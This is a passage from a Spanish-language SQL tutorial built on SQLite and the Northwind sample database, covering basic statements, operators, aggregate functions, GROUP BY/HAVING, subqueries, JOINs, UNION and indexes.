eliminar. Vamos a aplicarlo para borrar el campo previamente creado que fue Profesion, ejecutamos la consulta de manera exitosa.  Si nuevamente vemos nuestra tabla Estudiantes, ahora el campo profesion fue eliminado.  INSTRUCCION DROP #: Esta sentencia probablemente solo la utilizaremos cuando estemos en la fase de construcción de nuestra base de datos, ya que en esta etapa haciendo los cambios pertinentes hasta que este lista, de otro modo si la ejecutariamos en produccion los resultados serian desastrozos y posiblemente irreparables si no contamos con una copia de seguridad. ELIMINAR BASE DE DATOS - DROP DATABASE #: Para eliminar una base de datos solo debemos de ejecutar DROP DATABASE y seguidamente el nombre de la base de datos, sin embargo esta instrucción no se puede ejecutar en sqlite3 asi que tenemos que hacerlo manualmente, pero otros gestores si permiten esta opción asi es que es bueno saberlo.  ELIMINAR TABLA - DROP TABLE #: Para poder eliminar una tabla debemos de ejecutar la instrucción DROP TABLE y seguidamente el nombre de la tabla a eliminar. Vamos a crearnos para el proceso una tabla de nombre prueba, que contenga los campos nombre y edad con datos cualquiera.  Ahora en esa tabla ejecutaremos la instrucción y vemos que la tabla se elimina.  pero aqui hay algo que quisiera agregar, cuando ejecutamos nuevamente el comando este nos devuelve un error en vista que ya no existe la tabla.  Para poder solucionar eso cuando se realize una creación de tabla o eliminación usar la palabra reservada IF EXISTS y de esa manera comprueba la existencia de la tabla antes de borrarla y en consecuencia evitamos los errores.  IDENTIFICADORES #: Cuando estamos insertando registros, debemos de poder usar un metodo que nos permita diferenciar los registros de tal modo que cada uno de estos sea unico. Aqui es donde comenzamos a usar los identificadores los cuales son de dos tipos: claves primarias y claves foraneas. CLAVES PRIMARIAS - PRIMARY KEYS #: Cada tabla debe de tener su identificador unico, que no se puede repetir para poder diferencias los registros, esto se conoce como clave primary, la cual no puede ser nula y es autoincrementable.  Si queremos definir una clave primaria en nuestra tabla anteriormente creada, primero tendriamos que eliminar todos los registros, de otro modo no podremos hacerlo. Por ello siempre al momento de crear una tabla es necesario definir nuestra clave primaria y evitar problemas. En nuestro caso vamos a eliminar los registros para seguir trabajando con muestra tabla Àlumnos y esto lo hacemos con otra consulta la cual es DELETE. INSTRUCCION DELETE #: Para borrar los registros debemos usar la palabra reservada DELETE FROM y a continuación el nombre de la tabla.  Si queremos hacerlo de manera grafica, nos vamos a la opción Database Structure, buscamos la tabla y le damos en modificar. Se nos volvera a abrir nuevamente la misma pestaña de cuando creamos la tabla, pero ahora modificaremos los valores y añadiremos un campo id_alumno y seleccionaremos las opciones de PK clave primary - auto-incrementable.  Tambien podriamos hacerlo desde el apartado de Execute Sql insertando la siguiente consulta que nos marca el propio gestor. Una vez modificada la tabla, probamos a insertar nuevamente varios registros con INSERT INTO que lo vimos previamente.  No es necesario que especifiquemos el campo id_alumno, puesto que es auto-incrementable.  Debemos tener en cuenta que si ejecutamos varias consultas, entonces tenemos que separarlas con ;. Ahora verificamos los registros insetados haciendo uso del SELECT.  Si vemos esta vez el id_alumno nos muestra el numero de identificador distinto el cual hace que los registros que ahora tenemos sean unicos. CLAVES FORANEAS - FOREIGN KEYS #: Para entender lo que es una clave foranea, primero vammos a crear una neuva tabla y la llamaremos turno_clase. Como ya vimos anteriormente cada tabla tiene su clave primaria, pero esta vez vemos que en la tabla turno_clase existe un campo id_alumno que no esta haciendo referencia a una clave primaria ya que esta se repite. Entonces te preguntaras a que hace referencia entonces ese campo? Pues ese campo se llama clave foranea ya que se utiliza para hacer referencia a una clave primaria de otra tabla, en este caso a la clave de la tabla alumnos. Ya que la tabla turno_clase necesita hacer referencia a los alumnos mediante el valor unico que tienen correspondiente al id_alumno y con ese identificador podemos tener acceso a toda la información de los alumnos.  En este punto para poder continuar aprendiendo todas los tipos de consultas que nos falta es necesario que tengamos una Base de Datos de mayor escala y asi entender todo de manera mas clara, para ello vamos a descargarnos una de las tipicas bases de datos que se usan a la hora de aprender Sql. En este caso vamos a utilizar la base de datos de Northwind. db del siguiente enlace:  https://en. wikiversity. org/wiki/Database_Examples/Northwind/SQLiteUna vez vayamos a este enlace lo unico que tenemos que hacer es copiar toda la consulta entera y pegarla en el apartado de Execute SQL.  Si ahora nos dirigimos al apartado de Database Structure podemos visualizar la DB Northwind. db, y ahora estamos listos para continuar.  CLAUSULA AS O ALIAS #: Anteriormente vimos que podiamos seleccionar registro de las tablas usando SELECT, en este caso al ahora trabajar con northwind podemos probar a seleccionar alguna de las tablas como Customers.  Pero hay ocasiones como esta en las que nos resulte tedioso trabajar con tablas las cuales no creamos previamente nosotros y para poder entenderlas mejor queramos cambiar el nombre de los campos de estas por algo mas descriptivo para nostros, es posible esto?. Pues la respuesta es si y eso lo hacemos con la palabra reservada AS despues de seleccionar los campos deseados y especificamos el nombre al que queremos renombrar para que se muestren en los registros, no debemos olvidar que con FROM especificamos de que tabla queremos hacer la consulta.  Podriamos usar el mismo concepto para en la tabla Products, supongamos que en nuestra empresa un dia especifico se dan los productos a mitad de precio, nosotros podriamos mostrar el precio normal y tambien otro campo donde nos muestre el precio a la mitad. Ya que al precio ser un valor numerico podemos hacer operaciones como multiplicarlo, dividirlo y entre otras operaciones matematicas comunes como a continuación.  CLAUSULA ORDER BY #: Imaginemos una situación en la que tenemos una tabla, en este caso especifico la tabla Products.  Ahora en la empresa en la que trabajamos, nos piden ordenar la tabla pero no queremos que se ordene por defecto con el product_id, mas bien queremos ordenarlo por el precio. Pues en este caso utilizariamos ORDER BY y seguidamente el campo por el cual queremos ordenarla.  De este modo lo que haria la consulta seria ordenar la tabla en base a la columna de los Precios, pero vemos que nos los ordenar de menor a mayor y nosotros queremos que se ordenen los precios de mayor a menor ya que nos importan los prodcutos que cuestan mas. Pues en ese caso usuariamos DESC al final para poder ordenarlo en modo DESCENDENTE y de igual forma podriamos usar tambien ASC que nos lo ordenaria de manera ASCENDENTE Entonces te preguntaras genial, me ordenar segun el precio ya que es un valor numerico, pero que pasa si en vez de ese campo, lo ordeno por ProductName?. En ese caso tambien nos lo va ordenar pero al ser tipo de dato TEXT lo hara alfabeticamente.  CLAUSULA WHERE #: En SQL la capacidad de usar condicionales es muy importante ya que estas nos permiten encontrar consultas muy especificas. De igual forma que en los demas lenguajes de programación, podemos ejecutar una sentencia en la medida en que la condición se cumpla. Una de las formas de hacer esto en sql es con el uso de la clausula WHERE. Si ahora seleccionamos algun campo de una tabla de nuestra base de datos como en este caso de Products, la consulta nos devuelve todos los registros de los campos seleccioandos Pero supongamos nosotros solo queremos mostrar uno de ellos, concretamente lo correspondiente al producto Tofu. Pues aqui utilizarimos la clausula WHERE y seguida la condición en este caso queremos que el ProductName sea igual a Tofu.  Entonces la consulta nos devolveria los campos, donde solamente el ProductName = Tofu, y de cumplirse la condicion al ser TRUE nos los devuelve, de lo contrario si no existiera nos devolveria FALSE y no se nos mostraria. Ahora vamos a hacer algo un poquito mas complejo, supongamos que queremos obtener los productos solo si los precios son mayores a 50. En este caso usariamos los operadores de comparación en nuestra codición donde Price &gt; 50.  Tambien podriamos usar el WHEREcuando queremos eliminar registros, en este caso vemos que en la tabla Products, existe un producto donde el Precio = 0.  Entonces para eliminarlo usriamos la siguiente consulta usando DELETE y con WHERE, especificariamos la condición de modo tal que se elimine el registro solo si el precio es 0.  Si ahora volvemos a ejecutar la consulta vemos que efectivamente el registro se elimino.  INSTRUCCION UPDATE #: La instrucción UPDATE se utiliza para modificar los datos existentes de una o varias filas. Usaremos nuestra tabla Estudiantes para modificar la edad de nuestro registro donde el nombre es Juan y asignarle el valor de 30. Para actualizarlo debemos de ejecutar la instrucción UPDATE mas el nombre de la tabla Estudiantes, despues con SET espeficamos la columna con el valor que deseamos cambiar Edades = 30 y finalmente la condición con WHERE donde especificamos el resgistro especifico en nuestro caso donde el Nombre =  Juan .  Al ver nuevamente nuestra tabla Estudiantes, ahora en el campo edad nuestro usuario tiene el valor de 30.  OPERADORES EN SQL #: Los operadores son palabras clave en SQL que utilizamos para realizar comparaciones, calculo y combinar condiciones en las consultas y espresiones SQL. OPERADORES AND Y OR #: Vimos anteriormente que con WHERE podemos aplicar condiciones, pero en muchas ocasiones vamos a querer ejecutar multiples condiciones, y para poder hacerlo tendremos que usar AND o OR. OPERADOR AND #: Si ya tenemos conocimientos premios en cualquier lenguaje de programación, podemos sobreentender lo que hace AND, que basicamente nos devuelve un resultado de cumplirse ambas condiciones.  Ahora para el siguiente ejemplo vamos a seleccionar de la tabla Customers solo aquellos donde el pais sea Spain y la ciudad sea Madrid, en caso se cumplan ambas condicones quiero que me devuelva los registros.  OPERADOR OR #: Al contrario que el and, OR nos devuelve un resultado al cumplirse alguna de las dos condiones, no valida que se cumplan ambas ya que con solo cumplirse una de ellas esta nos devolvera un registro.  Supongamos vamos a hacer una consulta donde, queremos seleccionar a los clientes que son del pais de Argentina o que sean de la cuidad de Barcelona.  Como resultado tenemos registros donde los clientes son de Argentina y tambien a los clientes que son de la ciudad de Barcelona ya que con OR solo una de las condiones debe cumplirse para que me devuelva los registros. OPERADOR NOT #: Lo que hacemos con NOT es simplemente negar la sentencia que realizamos, de este modo al agregar el NOT el resultado que nos mostrara vendra a ser lo contrario a nuestra condicion en nuestra consulta. Si quedriamos realizar una consulta donde queremos obtener los precios que sean mayores a 80 de la tabla productos, si ejecutamos la consulta esta nos mostrara exactamente lo que queremos.  Pero si usamos NOT lo que se hace es negar la consulta y hacer lo contrario, basicamente con NOT le diriamos mediante una consulta que nos seleccione los precios donde NO sean mayores a 80.  OPERADOR LIMIT #: Cuando queremos limitar el numero de registros que nos arroja una consulta usamos LIMIT, con ello limitamos el numero de registros a cuantos queramos especificando la cantidad total en numeros despues de LIMIT. Supongamos que ahora queremos ejecutar una consulta que nos muestre de manera ordenada los precios de la tabla de los Products, eso lo hariamos facilmente utilizando ORDER BY . Pero en esta ocasión de esos precios ordenados solo queremos que se nos muestre los 5 primeros registros, pues ahi es donde vamos a utilizar el LIMIT.  y de esta manera tendriamos el precio de los 5 produtos mas caros. De la misma manera podriamos modificar la consulta y usar ASC y de esta manera nos mostraria los 5 productos de menor precio.  OPERADOR DISTINCT #: Este operador funciona de manera bastante similiar a NOT ya que cuando lo usamos nos ejecuta exactamente lo contrario o distinto a la consulta, pero no es exactamente igual ya que != es un operador de comparación y se ejecuta realizando una comparación con todos los registros hasta validar uno correcto.  En cambio NOT al ser un operador logico, trabaja haciendo la comparación directamente entre dos valores booleanos.  Si lo aplicamos != a efectos practicos en una consulta esta nos arrojara valores distintos al que especifiquemos, pero ahora ya tenemos en cuenta que no es lo mismo que usar NOT aunque ambos se asemejen mucho. OPERADOR BETWEEN #: Es un operador de comparación que se utiliza para seleccionar valores en un rango especifico, estos datos pueden ser de tipos numericos, fecha o texto. Veamos un ejemplo donde vamos a seleccionar un rango de precios de nuestra tabla Products, que iran desde 40 a 50.  Observamos que la consulta nos arroja unicamente los precios del rango establecido y de esta manera podemos simplificar nuestra consulta usando BETWEEN y de esta manera optimizamos nuestras consultas. Podemos tambien en vez de especicar un rango basandonos en un dato numerico, usar un dato de tipo fecha.  De esta manera podemos filtrar por un rango de fecha de nacimiento que corresponde a nuestros empleados de nuestra tabla Employees.  OPERADOR LIKE #: El operador LIKE, lo usamos para hacer un filtro basandonos en patrones de cadena de texto, parecido a una expresión regular pero sin llegar a esa complejidad. Para poder comprenderlo mejor vamos a usarlo para poder filtrar por cadenas de texto especificas en nuestra tabla de clients Customers. Realizaremos una consulta donde seleccionemos todos los datos del nombre de contacto ContactName de nuesta tabla Customers , donde con LIKE le especificamos que la cadena de texto especifico por la cual filtraremos, empieze con cualquier valor pero que termine con la palabra “Devon”. Esto lo hacemos anteponiendo el % y seguidamente el texto por el cual queremos filtrar  %TEXTO .  Del mismo modo si quisieramos que el filtrado sea parecido, pero que esta vez que el filtro empieze por un texto especifico y termine el cualquier cosa, solo debemos poder el %al final TEXTO%.  Pero tambien existe una forma de realizar un filtro, donde especifiquemos el texto independientemente comienze o termine, y que nos encuentre un resultado cuando unicamente contenga el texto. Para ello usamos al inicio y al final % y de esta manera especificamos que no importa si comienze o termine con algo especifico, simplemente nos imprime la consulta si encuentra un match o coincidencia.  De esta forma la consulta nos arroja varias coincidencias donde se cumple la condición. Ahora tambien podemos hacer otro tipo de filtrado usando LIKE, supongamos queremos realizar una consulta donde buscamos filtrar en nuestra tabla Employees, un nombre el cual comienze con la letra N, termine con la letra Y y ademas el nombre solo tenga cinco caracteres. En ese caso usaremos _, para especificar el numero total de caracteres desconocidos y en los extremos poner las letras conocidas.  Cada uno de los guiones bajos _, hace referencia a un caracter el cual puede ser cualquiera incluidos espacios. OPERADOR IS NULL Y IS NOT NULL #: En sql un valor NULL, representa un valor desconocido, cuando insertamos filas en una tabla, sin asignarles un valor, estas automaticamente toman el valor nulo NULL. Este valor al ser especial no podemos compararlo con operadores aritmeticos normales, en su lugar debemos usar los operadores IS o IS NOT. Si seleccionamos todo de la tabla Products y aplicamos un ordenamiento basandonos en ProductName, por defecto esta nos devolvera al inicio los valores NULL, de existir estos.  Pero si aplicamos la condición donde vamos a indicarle que nos devuelvan solo los valores NULL. Para ello usamos IS NULL.  Y si al contrario me molestan ver los valores nulos y quiero quitarlos, pues usamos IS NOT NULL.  la consulta nos devolvera todos los valores a excepción de los valores NULL. OPERADOR IN Y NOT IN #: Estos operadores simplifican el uso de usar multiples veces el operador AND y OR al establecer multiples condiciones, ya que opera dentro de una lista de valores similar a una tupla (valor1, valor2, valor3. valor4). Supongamos queremos listar varios ProductID de la tabla Products, en ese caso deberiamos ejecutar la siguiente consulta.  Obtendriamos el resultado deseado, pero escribiriamos muchas lineas de codigo, lo que no seria optimo y mas bien tedioso. Justo en estos casos usamos IN y de esta manera podemos operar sobre un grupo de valores y reducir varias lineas de nuestra consulta, y logrando que sea mas optima.  De la misma manera con NOT IN, hacemos exactamente el mismo proceso, solo que esta vez al usar el NOT se ejecutara lo contrario y imprimira los valores que no correspondan.  COMENTARIOS EN SQL #: En SQL como en distintos lenguajes de programación usamos los comentarios para añadir una descripción al proposito de nuestro codigo. COMENTAR UNA LINEA #: En SQL usamos los -- para poder comentar una linea de codigo. /*COMENTARIO*/ si queremos comentar varias lineas.  COMENTAR VARIAS LINEAS #: Si queremos comentar varias lineas de codigo usamos /*COMENTARIO*/.  FUNCIONES DE AGREGACION #: Las funciones de agregación nos permiten efectuar operaciones sobre un conjunto de resultados, pero devolviendo un unico valor para todos ellos. En palabras mas simples nos permite obtener la media, maximos, minimos, sumantorias entre otras operaciones. Estas funciones se utilizan con la clausula SELECT. Veamos a continuación algunas de estas funciones: FUNCION SUM #: La función SUM nos devuelve la suma de los valores de un campo que especifiquemos, cabe mencionar que solo podemos usar esta función en valores numericos. Por ejemplo si deseamos sumar todos los precios Price de la tabla Products, emitiriamos la siguiente consulta: Donde dentro de los () de la función SUM, especifiriamos el campo el cual queremos sumar. Aqui para tener una apreciación mejor podriamos crearnos un ALIAS y establecer el nuevo campo como SUMA_TOTAL_PRECIOS.  FUNCION COUNT #: Esta función nos devuelve el numeros total de las filas seleccionadas. De la misma manera debemos especificar dentro de () el campo cuando agregemos la función COUNT.  La consulta nos devuelve el total de filas del campo ProductName. FUNCION MIX #: La función MIN nos devuelve el minimo valor de un campo.  Al aplicar la función en el campo Price, obtenemos el valor del precio minimo. FUNCION MAX #: Max nos devuelve el maximo valor del campo espeficado.  Aplicando la función en el mismo campo Price, obtenemos el valor del precio maximo. FUNCION AVG #: La función AVG, nos devuelve como resultado el promedio del campo que especifiquemos.  Como se resultado obtenemos el promedio de los precio de el campo Price, pero vemos que nos muestra un valor con muchas decimales, en ese caso podemos utilizar la función ROUND para redondear el valor. FUNCION ROUND #: Como mencionamos anteriormente esta función nos va a redondear un valor, dandonos como resultado el valor entero. Podemos aplicarlo a nuestra consulta anterior donde obteniamos el promedio, para que nos devuelva un valor entero.  Aplicamos ROUND encima de la función AVG y obtenemos el promedio redondeado.  Estas funciones mencionadas son las basicas de SQL y ademas las mas utilizadas, ya que cada gestor ofrece su propio conjunto mas amplio con otras funciones mas particulares. CLAUSULA GROUP BY #: La clausula GROUP BY, la utilizamos para agrupar uno o varios registros segun uno o varios valores de la columna. Como vemos a continuación tenemos el detalle de las ventas de los productos, pero si nosotros qusieramos obtener la cantidad de ventas por producto. En este caso usariamos la clausula GROUP BY y de este modo obtendriamos un ordenamiento de cada producto segun su cantidad.  Supongamos que queremos obtener el promedio del precio de lo que cuestan los productos que ofrece cada proveedor. Primero seleccionaremos el campo id del proveedor SupplierID y el promedio redondeado de la tabla Products. Esto nos dara como resultado el promedio total de los productos y el id que nos mostrara sera el primero, ya que como estamos usando una función de agregación esta solo devuelve un unico valor.  Y si ahora utilizamos GROUP BY en el campo SupplierID, lo que hara sera agruparnos por cada uno de los SupplierID correspondientes a cada proveedor.  Como resultado obtendriamos el promedio del precio Price de los productos que ofrece cada uno de nuestros proveedores. Y que hacemos si ahora que obtuvimos el promedio queremos verlos en orden. Pues simplemente como vimos anteriormente agregaremos a nuestra consulta un ORDER BY DESC y de esta manera verias los promedios ordenador de mayor a menor.  Ahora que pasa si queremos usar una condición en esta consulta, donde solo nos muestre el promedio PRECIO_PROMEDIO obtenido, pero solo si es mayor a 40. Entonces automaticamente uno pensaria en usar una condición WHERE, pero esta nos arroja un error.  Seguro te preguntaras por que me esta arrojando un error si estoy estableciendo una condición correctamente? Pues esto se debe a que WHERE trabaja haciendo un filtro de registros y en este caso al estar trabajando con GROUP BY y con una función de agregación, pasariamos a estar trabajando con grupos y por ese motivo WHERE en este caso siempre nos daria un error. CLAUSULA HAVING #: Anteriormente mencionamos que al trabajar con GROUP BY, pasariamos de tratar con registros a hacer un filtrado por grupos. Por tanto asi como WHERE realiza un filtrado por registros, cuando queremos ejecutar condiciones en grupos usamos la clausula HAVING que funciona exactamente igual a WHERE pero cabe mencionarlo nuevamente lo usamos cuando trabajamos con grupos. Por lo tanto recordando nuestra anterior consulta donde queriamos que se nos muestre PRECIO_PROMEDIO, pero solo si este era mayor a 40, nuestra consulta seria la siguiente.  Veamos un nuevo ejemplo para que nos quede completamente claro. Vamos a suponer que queremos obtener cual fue el producto mas vendido del total de ventas. Para ello usaremos la tabla de los detalles de la orden OrderDetails, donde seleccionaremos el campo de ProductID y el de Quantity.  Despues aplicaremos la función de agregación SUM() para sumar las cantidades Quantity y las agruparemos con GROUP BY por el id del producto ProductID.  De esta manera obtendremos la cantidad de productos agrupados segun el id de producto ProductID. Finalmente aplicaremos un ordenamiento ORDER BY por CANTIDAD_TOTAL de manera descendente y como solo queremos que se muestre el ProductID que mas se vendio usamos un LIMIT 1 y obtendriamos el resultado.  Bien ahora quiza te puedas preguntar por que añadimos un ORDER BY y despues un LIMIT si podriamos haber usado un HAVING para usar una condición donde en base a CANTIDAD_TOTAL nos de el valor maximo empleando la función MAX.  Vemos que nos arroja un error.  Esto se debe a que no es posible ejecutar una función de agregación sobre el resultado de otra función de agregación. Asi que esa opción estaria descartada. SUBCONSULTAS #: Hasta ahora hemos realizado consultas basandonos en una sola tabla, pero que pasa en los casos donde necesitemos juntas campos de distintas tablas para consultar algo concreto. Pues en ese caso existen algunas maneras y una de ellas es utilizando las Subconsultas. Para pode usar este concepto primero debemos entender el concepto de tablas relacionales y si queremos trabajar con datos de varias tablas a traves de una relación debemos usar los deintificadores. Anteriomente gracias a las consultas GROUP BY y HAVING, pudimos agrupar por los identificadores y encontrar el producto que fue mas vendido. Pero si nos ponemos a analizar, el hecho de saber cual producto se vendio mas, no quiere decir que fue el que mas ganancias nos dio. Y si quisieramos saber cual producto nos genero mas ingresos, en este caso tendriamos que relacionar las tablas OrderDetails y Products. Aqui es donde podemos usar el concepto de Subconsultas que no es mas que una consulta dentro de otra consulta, es decir viene a ser una consulta que hace referencia a otra consulta.  Cuando realizamos una consulta esta nos devuelve un valor , y una subconsulta como vemos en la imagen es realizar una nueva consulta de ese valor.  Una cosa a tener en cuenta es que una Subconsulta solo puede ser un SELECT ya que esta solo nos devuelven información y no alteran a la base de datos. Vamos a verlo de manera practica, y vamos a realizar una consulta que ademas de mostrarnos el id del producto ProductIDy la cantidad Quantity, tambien nos muestre el nombre del producto ProductName. Para ello primero seleccionaremos los campos ProductID y Quantity de la tabla OrderDetails Ahora en una consulta aparte, vamos a seleccionar el campo faltante ProductName correspondiente a la tabla Products Esta consulta sera la que utilizaremos para realizar una subconsulta dentro de nuestra primera consulta. Para ello debemos de integrarlo en nuestra consulta principal como un campo y ponerlo entre () y podemos ponerle el alias al que corresponde.  Podemos ver que si se nos esta incluyendo el campo, pero solo se nos muestra el primer resultado repetido. Esto se debe a que al ejecutar un SELECT, por cada ejecución nos esta deolviendo el primer campo, y por lo tanto dentro debemos de establecer una condición en la que comparemos que el ProductID de la tabla OrderDetails sea igual al del ProductID de la tabla Products.  Ejecutamos la consulta correctamente, pero ahora vemos que nos vuelve a mostrar el mismo resultado. Y esto se debe a que dentro de la subconsulta no se sabe a que tabla esta haciendo referencia el ProductID, por lo tanto debemos especificar que esta haciendo referencia a OrderDetails.  De esta manera vemos que ahora si, nos muestra los resultados correctamente. Y si quiseramos adicionar mas campos, hariamos exactamente el mismo proceso solo especificando el nombres de los campos.  Ahora que ya comprendimos como funcionan las subconsultas, volvamos a resolver lo anteriomente propuesto en el que habiamos obtenido el producto que se vendio en mayor cantidad, pero no el que mas ingreso nos genero. Teniamos previamente la CANTIDAD_TOTAL.  Ahora debemos agregar la subconsulta que nos devuelva el precio Price, podemos usar un alias para acortar el nombre de la tabla OrderDetails como OD.  Ahora solo nos faltaria calcular el monto total e ingreso, para ello tendriamos que multiplicar la CANTIDAD_TOTAL por el PRECIO, pero debido a que no podemos usar un ALIAS, necesariamanete debemos insertar nuevamente la subconsulta que nos generaba el alias y de la misma manera tambien insertar la función de agregación, adicionalmente agregaremos el NOMBRE_PRODUCTO para verlo mas descriptivo.  Y en conclusión vemos que el producto que mas se vendio, no necesariamente corresponde al que mas ingresos nos aporto. Otra cosa acerca de las subconsultas, es que tambien las podemos usar en condicionales como un WHERE, para realizar operaciones con un campo sin necesidad de mostrarlo. Para ello vamos a modificar nuestra consulta anterior y borrar el campo que correspondia a el PRECIO y utilizarlo para establecer una condición donde solo nos devuelva los precios mayores a 100.  Algo muy intersante a mencionar es que el resultado de esta subconsulta, nos devuelve una especie de tabla virtual en la que podemos seguir trabajando. Ya que nuestra subconsulta anterior, podemo meterla dentro de un SELECT y volver a trabajar desde ahi como si fuera otra tabla mas simplificado.  De esta manera podemos trabajar en ella como si fuera otra tabla, como en este caso seleccionando el campo NOMBRE_PRODUCTO. Intentemos realizar algo mas complejo usando subconsultas, como mostrar el total de ordenes realizadas por los clientes, siempre y cuando estas sean mayores a su promedio. Par ello primero tenemos que seleccionar el nombre CustomerName de la tabla empleados Employees y dentro ejecutaremos una subconsulta que nos muestre la suma de la cantidad de ordenes SUM(Quantity) esto de la tabla OrderDetails y de la tabla Orders.  Esto nos devolvera la CANTIDAD_DE_ORDENES_REALIZADAS, pero con solo un valor muy grande referido a la cantidad total de ordenes despues de realizar una especie de multiplicación como un producto cartesiano que no es la correspondiente y para poder obtener el valor verdadero. Debemos de establecer una primera condición donde el CustomerID de la tabla Customers sea igual al de la tabla Orders.  Ahora tambien debemos validar que el id de la orden OrderID de la tabla Orders y OrderDetails sea el mismo, y de esta manera obtendriamos la cantidad total de ordenes realizadas por nuestros clientes Customers.  Ya llegados a este punto queremos que solo nos muestren los resultados que sean mayor al promedio de ordenes. Para esto tenemos que recordar lo anteriormente mencionado de que podemos efectuar subconsultas en un WHERE, por ello primero buscaremos calcular el promedio del total de ordenes de el resultado de una subconsulta a la que llamaremos CANTIDAD_TOTAL_ORDENES proveniente de la tabla Customers al cual asignaremos como alias C2 para evitar problemas ya que contamos con una denombre C1.  Y dentro de esa subconsulta vamos a insertar la primera subconsulta que realizamos con la cual obteniamos la CANTIDAD_ORDENES_REALIZADAS, solo que esta vez provendra de la tabla Customers con el alias C2.  Asi con el uso de subconsultas, lograriamos obtener el resultado donde la CANTIDAD_ORDENES_REALIZADAS son mayores al promedio. Con esto concluimos que podemos usar las subconsultas en ciertos casos, pero existe una forma mejor de poder realizar estas acciones y nos eviten tener un codigo tan extenso como el que generamos y estos vendrian a ser los JOINS de los cuales hablaremos a continuación. JOINS #: Son operaciones que realizamos para combinar los datos de dos o mas tablas de nuestra base de datos, pero que esta información se devuelva en una tabla nueva. Existen varios tipos de JOINS y entre los principales tenemos cinco: CROSS JOIN #: Son el resultado de unir dos tablas, como si se tratase de un producto cartesiano. Supongamos tenemos dos tablas, una de estudiantes y otra de lenguajes, si aplicaramos un CROSS JOIN daria como resultado el producto cartesiano de ambas tablas.  Existen dos formas de definirlos, las cuales son implicita y explicita. Implicitamente cuando definimos un CROSS JOIN, pero sin usar el termino JOIN. Si lo aplicamos a las tablas de empleados Employees y ordenes Orders, nos da como resultado el producto cartesiano de ambas ya que nuestra tabla Employees tiene 10 registros y Orders 196, como resultado nos devuelve 1960 registro relacionados.  Tambien podemos obtener el mismo resultado si lo aplicamos de manera explicita, para ello varia un poco la sintaxis.  Este tipo de join casi no se usa, pero es recomendable conocer como funciona. INNER JOIN #: Es el resultado de la busqueda de coincidencia de dos o mas tablas en función a la columna que tengan en comun.  Supongamos tenemos dos tablas una de personas que estudian y otra de personas que trabajan, como resultado el INNER JOIN nos daria unicamente las coincidencias de ambas tablas donde las personas estudian y trabajan.  Para aplicarlo a nuestra tablas de empleados y ordenes, primero debemos seleccionar nuestra tabla Employees y seguidamente INNER JOIN con la tabla Orders y finalmente para ejecutar la concidencia usaremos ON especificando que queremos nos lo ejecute solo cuando el EmployeeID de ambas tablas sean iguales. Esto nos dara como resultado una nueva tabla donde solo nos muestren los datos cuando coincidan los EmployeeID en ambas tablas.  Para entenderlo mejor de manera practica, vamos a crearnos una tabla adicional con el nombre Gratificacion, en donde haremos referencia al EmployeeID.  Ahora insertaremos algunos valores al azar para poder trabajar nuestro JOIN con esta tabla.  Adicional a ello insertaremos algunos valores NULL, para este caso.  Nuestra tabla nos queda de la siguiente forma, donde podemos observar existen valores nulos.  Ahora vamos a proceder a realizar un INNER JOIN, tomando como tablas Employees y Gratificacion.  Como resultado, podemos ver que solo se nos muestran las coincidencias y no los valores NULL ya que estos al no coincidir con el EmployeeID no los concidera. LEFT JOIN #: En el LEFT JOIN se toma como prioritaria a toda la tabla de la izquierda y solo una parte de la tabla derecha, concretamente solo si existe alguna coincidencia.  Usemos el mismo caso donde tenemos dos tablas de personas que estudian y otra de personas que trabajan, si aplicamos un LEFT JOIN, como resultado tendriamos todos los datos de la tabla personas que estudian con sus coincidencias y de no existir alguna se completaria con valores NULL.  Si ahora lo vemos de manera practica y usamos en nuestras tablas Employees y Gratificacion, es muy simple ya que solo debemos cambiar la palabra inner por LEFT y igualmente para establecer la comparacion usamos ON.  El resultado de la consulta nos muestra todos los valores de la tabla Employees y de la tabla Gratificacion solo los valores donde exista coindencias, y en las que no existan nos las completa con valores nulos. RIGHT JOIN #: Similar al left join cuando usamos RIGHT JOIN, se toman todos los datos de la tabla derecha y solo parte de la izquierda.  De la misma manera con nuestras tablas de persona que estudian y trabajan, al aplicar un RIGHT JOIN tendriamos como resultado todos los valores de la tabla derecha personas que trabajan y de no existir coincidencias de igual modo se completarian con datos de tipo NULL.  Aplicandolo nuevamente a nuestras tablas Employees y Gratificacion, seria muy parecido a lo anterior, solo que en este caso particular, sqlite3 no admite la función RIGHT JOIN, ya que si la tratamos de ejecutar nos genera un error. Aunque en otros tipos de gestores esta opción si es valida, hay un manera logica y facil de solucionar esto en sqlite3 y es tan sencillo como aplicar un LEFT JOIN, pero cambiar el orden de las tablas y de esa manera es como si ejecutaramos un RIGHT JOIN.  Y asi de una forma simple logramos aplicar un RIGHT JOIN que vendria mas o menos a ser un LEFT JOIN inverso . FULL JOIN #: A diferencia que el left y right join, cuando aplicamos un FULL JOIN nos devuelve todo, es decir la suma de las tablas.  Es la union de todas las tablas, al aplicar un FULL JOIN, nos devuelve todos los valores de ambas tablas y no de existir coindencias entre algunos campos, de la misma manera nos los muestra con valores nulos NULL.  Para poder aplicarlo en sqlite3 de manera practica, tambien tenemos un problema puesto que tampo acepta la ejecución de FULL JOIN, pero para ello podemos usar una clausulaque nos permita unir tanto el LEFT JOIN como el RIGTH JOIN y esta tiene por nombre UNION. CLAUSULA UNION #: La clausula UNION la utilizamos para combinar el resultado de dos o mas consultas en un solo conjunto de datos. Para poder usar esta clausula se deben tener la misma cantidad de columnas y los tipos de datos deben de ser compatibles. Lo que hace concretamente UNION es la devolvernos una unica tabla que contenga las filas combinadas de las tablas, eliminando las duplicadas.  Si ahora ejecutamos un LEFT JOIN y un RIGHT JOIN, al unir ambas consultas con un UNION obtendremos como resultado un FULL JOIN simulado.  CLAUSULA UNION ALL #: A diferencia que al usar union, cuando usamos la clausula UNION ALL, de la combinación de las filas no se eliminan las que son duplicadas y tampoco se realiza una verificación de la compatibilidad de datos.  Como resultado si lo aplicamos a nuestros JOINS, nos devulve mas datos, donde podemos ver que estos se duplican.  En conclusión podriamos inferir que al combinar con UNION nos elimina las filas duplicadas y al usar UNION ALL de existir filas duplicadas las muestra. INDICES #: Los indices en SQL vienen a ser una estructura de datos que mejoran la velocidad de la consultas y las operaciones de busquedas en un tabla. En terminos mas simples un indice nos permite acceder rapidamente a los registros de una tabla en función de los valores de una o mas columnas, de esta manera nuestras busquedas son mas eficientes. INDICES ORDINARIOS - INDEX #: Los indices ordinarios o no unicos, crean indices que se pueden duplicar y ademas permiten incluir valores nulos. Solo usa el indice para buscar mas rapido pero obvia si existen o no duplicados. Para crear un indice debemos usar CREATE INDEX y seguido el nombre a asignar, depues con ON especificaremos de que tabla queremos crear el indice y finalmente entre () debemos espeficar el campo especifico sobre el cual lo aplicaremos. En este 